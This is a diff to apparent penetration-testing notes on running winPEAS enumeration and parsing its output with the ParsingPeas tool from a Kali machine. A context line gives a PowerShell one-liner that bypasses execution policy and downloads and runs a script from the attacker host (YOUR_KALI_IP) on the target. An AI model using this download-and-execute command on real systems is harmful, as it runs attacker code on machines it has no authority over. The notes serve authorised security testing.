@@ -15,13 +15,10 @@ Use batch script on older Windows OS if needed.
 ## ParsingPeas workflow (preferred)
 Primary parser/workflow: https://github.com/YuvalMil/ParsingPeas
 
-On Kali:
+From your tooling:
 ```bash
-git clone https://github.com/YuvalMil/ParsingPeas
-cd ParsingPeas
-./setup.sh
-pip3 install -r requirements.txt
-python3 receiver.py
+parsingpeas windows --lhost YOUR_KALI_IP
+parsingpeas windows --lhost YOUR_KALI_IP --start
 ```
 
 On target:
@@ -29,7 +26,8 @@ On target:
 powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_KALI_IP:8000/wrapper-inline.ps1')"
 ```
 
-This keeps the full workflow on your Kali box: serve PEAS, collect output, and generate the HTML report automatically.
+If ParsingPeas is not already checked out locally, the helper prints the exact clone/setup/start commands too.
+If you also need `payload-server`, leave ParsingPeas on `8000` and move `payload-server` to another port such as `8001`.
 
 ## winPEAS manual output capture
 ```
@@ -39,7 +37,7 @@ copy .\winpeas.out Z:\downloads\winpeas\
 Use `log=winpeas.out` for more portable output.
 If you are not using the full ParsingPeas receiver flow, parse the saved file on Kali with:
 ```bash
-python3 parser.py /path/to/winpeas.out
+python3 ~/tools/ParsingPeas/parser.py /path/to/winpeas.out
 ```
 
 Other popular automated enumeration tools:
